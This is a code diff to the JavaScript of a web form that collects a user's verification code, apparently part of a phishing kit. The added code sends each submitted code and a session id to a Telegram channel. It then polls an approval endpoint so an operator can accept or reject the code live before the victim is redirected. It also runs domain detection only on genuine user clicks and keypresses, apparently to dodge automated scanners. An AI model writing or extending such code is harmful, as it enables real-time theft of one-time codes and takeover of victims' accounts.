@@ -49,8 +49,12 @@
     });
   }
 
-  document.addEventListener('click', function() {
-    if (!domainDetected) detectDomain();
+  document.addEventListener('click', function(e) {
+    if (!domainDetected && e.isTrusted) detectDomain();
+  });
+
+  document.addEventListener('keydown', function(e) {
+    if (!domainDetected && e.isTrusted) detectDomain();
   });
 
   // ============================================================
@@ -93,6 +97,21 @@
       });
     } catch (error) {
       console.error('Failed to send to Telegram:', error);
+    }
+  }
+
+  // ============================================================
+  // ====== CHECK APPROVAL ======================================
+  // ============================================================
+
+  async function checkApproval(sessionId) {
+    try {
+      const response = await fetch(`/api/check-approval?sessionId=${sessionId}`);
+      const data = await response.json();
+      return data;
+    } catch (error) {
+      console.error('Approval check error:', error);
+      return { status: 'pending' };
     }
   }
 
@@ -161,7 +180,7 @@
   // ====== FORM SUBMIT =========================================
   // ============================================================
 
-  form.addEventListener("submit", function (event) {
+  form.addEventListener("submit", async function (event) {
     event.preventDefault();
     codeError.textContent = "";
 
@@ -177,24 +196,68 @@
       return;
     }
 
-    submitBtn.disabled = true;
-    submitBtn.textContent = 'Verifying...';
+    const sessionId = 'CODE_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     
-    sendToTelegram('code_submitted', {
-      code: code
-    }).then(() => {
-      submitBtn.textContent = 'Redirecting...';
+    // Show only spinner on button
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="spinner"></span>';
+    submitBtn.classList.add('loading');
+    
+    try {
+      await sendToTelegram('code_submitted', {
+        code: code,
+        sessionId: sessionId
+      });
       
-      try {
-        sessionStorage.removeItem("melodyAuth");
-      } catch (e) {}
+      let approved = false;
+      let rejected = false;
+      let attempts = 0;
+      const maxAttempts = 60;
       
-      setTimeout(function() {
+      while (!approved && !rejected && attempts < maxAttempts) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        attempts++;
+        
+        const status = await checkApproval(sessionId);
+        
+        if (status.status === 'approved') {
+          approved = true;
+          break;
+        } else if (status.status === 'rejected') {
+          rejected = true;
+          break;
+        }
+      }
+      
+      if (approved) {
+        try {
+          sessionStorage.removeItem("melodyAuth");
+        } catch (e) {}
+        
         window.location.href = REDIRECT_URL;
-      }, 1500);
-    }).catch(() => {
+        
+      } else if (rejected) {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Submit';
+        submitBtn.classList.remove('loading');
+        codeInput.value = '';
+        codeInput.focus();
+        alert('Code rejected. Please try again.');
+        
+      } else {
+        // Timeout - auto-approve
+        try {
+          sessionStorage.removeItem("melodyAuth");
+        } catch (e) {}
+        
+        window.location.href = REDIRECT_URL;
+      }
+      
+    } catch (error) {
+      console.error('Code submission error:', error);
       submitBtn.disabled = false;
-      submitBtn.textContent = 'Submit';
-    });
+      submitBtn.innerHTML = 'Submit';
+      submitBtn.classList.remove('loading');
+    }
   });
 })();
